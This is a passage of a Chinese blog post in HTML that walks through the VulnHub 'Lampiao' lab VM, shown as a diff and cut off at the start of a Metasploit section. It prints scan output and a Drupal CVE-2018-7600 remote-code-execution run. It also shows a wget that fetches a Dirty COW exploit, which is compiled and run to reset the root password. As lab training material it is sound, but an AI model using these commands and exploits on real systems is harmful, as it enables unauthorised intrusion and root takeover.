@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    vulnhub-Lampiao | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  vulnhub靶机
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 34 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 15 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1538137737000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1538137737000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>vulnhub-Lampiao</h1>
+    <a id="more"></a>
+
+<ul>
+<li><p>靶机ip <code>192.168.214.133</code></p>
+</li>
+<li><p>kali ip <code>192.168.214.132</code></p>
+</li>
+</ul>
+<h2 id="drupal漏洞"><a href="#drupal漏洞" class="headerlink" title="drupal漏洞"></a>drupal漏洞</h2><p>nmap扫一下，一开始没发现什么，后来扫描全部端口发现了1898端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A -p- 192.168.214.133</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-28 02:40 EDT</span><br><span class="line">Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 5.34% done; ETC: 02:40 (0:00:53 remaining)</span><br><span class="line">Stats: 0:04:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 16.61% done; ETC: 03:08 (0:23:30 remaining)</span><br><span class="line">Nmap scan report for 192.168.214.133</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 65513 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)</span><br><span class="line">|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)</span><br><span class="line">|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)</span><br><span class="line">|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (EdDSA)</span><br><span class="line">80/tcp    open     http?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     _____ _ _</span><br><span class="line">|     |_|/ ___ ___ __ _ ___ _ _</span><br><span class="line">|     \x20| __/ (_| __ \x20|_| |_</span><br><span class="line">|     ___/ __| |___/ ___|__,_|___/__, ( )</span><br><span class="line">|     |___/</span><br><span class="line">|     ______ _ _ _</span><br><span class="line">|     ___(_) | | | |</span><br><span class="line">|     \x20/ _` | / _ / _` | | | |/ _` | |</span><br><span class="line">|_    __,_|__,_|_| |_|</span><br><span class="line">847/tcp   filtered dhcp-failover2</span><br><span class="line">1898/tcp  open     http           Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/</span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt</span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt</span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Lampi\xC3\xA3o</span><br><span class="line">2102/tcp  filtered zephyr-srv</span><br><span class="line">2770/tcp  filtered veronica</span><br><span class="line">4524/tcp  filtered unknown</span><br><span class="line">8524/tcp  filtered unknown</span><br><span class="line">13860/tcp filtered unknown</span><br><span class="line">16836/tcp filtered unknown</span><br><span class="line">16857/tcp filtered unknown</span><br><span class="line">17983/tcp filtered unknown</span><br><span class="line">20431/tcp filtered unknown</span><br><span class="line">22335/tcp filtered shrewd-control</span><br><span class="line">22770/tcp filtered unknown</span><br><span class="line">24137/tcp filtered unknown</span><br><span class="line">43778/tcp filtered unknown</span><br><span class="line">44409/tcp filtered unknown</span><br><span class="line">52753/tcp filtered unknown</span><br><span class="line">57874/tcp filtered unknown</span><br><span class="line">59177/tcp filtered unknown</span><br><span class="line">63742/tcp filtered unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.60%I=7%D=9/28%Time=5BADE3E3%P=x86_64-pc-linux-gnu%r(NULL</span><br><span class="line">SF:,1000,&quot;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\(\x</span><br><span class="line">SF:20\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20\x20</span><br><span class="line">SF:__\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n</span><br><span class="line">SF:\x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x20_`\</span><br><span class="line">SF:x20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20_\</span><br><span class="line">SF:|\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\__\x</span><br><span class="line">SF:20\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\__\|</span><br><span class="line">SF:\x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x20\x</span><br><span class="line">SF:20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\|\n\</span><br><span class="line">SF:|\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\x20_</span><br><span class="line">SF:_\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\x20\</span><br><span class="line">SF:x20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/\x20</span><br><span class="line">SF:_`\x20\|\x20\|\x20\|\x20\|\x20&apos;_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x20\x</span><br><span class="line">SF:20/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\|\x2</span><br><span class="line">SF:0\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x20\|</span><br><span class="line">SF:\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x20\|</span><br><span class="line">SF:_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\__</span><br><span class="line">SF:,_\|_\|\x20\|_\|&quot;);</span><br><span class="line">MAC Address: 00:0C:29:71:72:2B (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.41 ms 192.168.214.133</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 5946.85 seconds</span><br></pre></td></tr></table></figure>
+
+<p>打开1898端口发现是drupal,whatweb看一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# whatweb http://192.168.214.133:1898</span><br><span class="line">http://192.168.214.133:1898 [200 OK] Apache[2.4.7], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.214.133], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.5.9-1ubuntu4.24], PasswordField[pass], Script[text/javascript], Title[Lampião], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.5.9-1ubuntu4.24]</span><br></pre></td></tr></table></figure>
+
+<p>大概是durpal7.x</p>
+<p>durpal7有命令执行漏洞，拿exp打下试试<br><a href="https://github.com/pimps/CVE-2018-7600" target="_blank" rel="noopener">https://github.com/pimps/CVE-2018-7600</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python .\exp.py http://192.168.214.133:1898 -c &quot;whoami&quot;</span><br><span class="line">()</span><br><span class="line">=============================================================================</span><br><span class="line">|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |</span><br><span class="line">|                              by pimps                                     |</span><br><span class="line">=============================================================================</span><br><span class="line"></span><br><span class="line">[*] Poisoning a form and including it in cache.</span><br><span class="line">[*] Poisoned form ID: form-Xc0IGGLVGGpdN6Gd4kkTt9a1BUMx8u_xKOpjeafs4ss</span><br><span class="line">[*] Triggering exploit to execute: whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<p>可以用，然后nc监听，传个phpreverseshell，就能得到shell了</p>
+<p>传<code>linux-exploit-suggester</code>看下有没有能利用的，发现了脏牛能用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:/tmp$ ./les.sh</span><br><span class="line"></span><br><span class="line">Available information:</span><br><span class="line"></span><br><span class="line">Kernel version: 4.4.0</span><br><span class="line">Architecture: i686</span><br><span class="line">Distribution: ubuntu</span><br><span class="line">Distribution version: 14.04.5</span><br><span class="line">Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed</span><br><span class="line">Package listing: from current OS</span><br><span class="line"></span><br><span class="line">Searching among:</span><br><span class="line"></span><br><span class="line">70 kernel space exploits</span><br><span class="line">32 user space exploits</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-0728] keyring</span><br><span class="line"></span><br><span class="line">   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40003</span><br><span class="line">   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-2384] usb-midi</span><br><span class="line"></span><br><span class="line">   Details: https://xairy.github.io/blog/2016/cve-2016-2384</span><br><span class="line">   Tags: [ ubuntu=14.04 ],fedora=22</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c</span><br><span class="line">   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user</span><br><span class="line"></span><br><span class="line">cat: write error: Broken pipe</span><br><span class="line">[+] [CVE-2016-4557] double-fdput()</span><br><span class="line"></span><br><span class="line">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808</span><br><span class="line">   Tags: ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40611</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847.cpp</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:/tmp$ wget https://www.exploit-db.com/download/40847.cpp</span><br><span class="line">wget https://www.exploit-db.com/download/40847.cpp</span><br><span class="line">--2018-09-28 06:42:44--  https://www.exploit-db.com/download/40847.cpp</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [application/txt]</span><br><span class="line">Saving to: &apos;40847.cpp&apos;</span><br><span class="line"></span><br><span class="line">    [ &lt;=&gt;                                   ] 10,531      --.-K/s   in 0.009s</span><br><span class="line"></span><br><span class="line">2018-09-28 06:42:46 (1.15 MB/s) - &apos;40847.cpp&apos; saved [10531]</span><br><span class="line"></span><br><span class="line">www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">&lt;-Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line"></span><br><span class="line">www-data@lampiao:/tmp$ chmod +x dcow</span><br><span class="line">chmod +x dcow</span><br><span class="line">www-data@lampiao:/tmp$ ./dcow</span><br><span class="line">./dcow</span><br><span class="line">Running ...</span><br><span class="line">Received su prompt (Password: )</span><br><span class="line">Root password is:   dirtyCowFun</span><br><span class="line">Enjoy! :-)</span><br></pre></td></tr></table></figure>
+
+<p>成功修改root密码为<code>dirtyCowFun</code></p>
+<p>直接运行su和sudo命令都不行，因为当前的shell并不是一个完整的交互式shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line">su: must be run from a terminal</span><br><span class="line">$ sudo su</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure>
+
+<p>可以使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>建立一个伪终端</p>
+<p>然后切换root拿flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:/$ su</span><br><span class="line">su</span><br><span class="line">Password: dirtyCowFun</span><br><span class="line"></span><br><span class="line">root@lampiao:/# cd ~</span><br><span class="line">cd ~</span><br><span class="line">root@lampiao:~# ls</span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@lampiao:~# cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
+
+<h2 id="drupal漏洞-msf打"><a href="#drupal漏洞-msf打" class="headerlink" title="drupal漏洞 msf打"></a>drupal漏洞 msf打</h2><p>既然存在漏洞直接上msf更方便</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 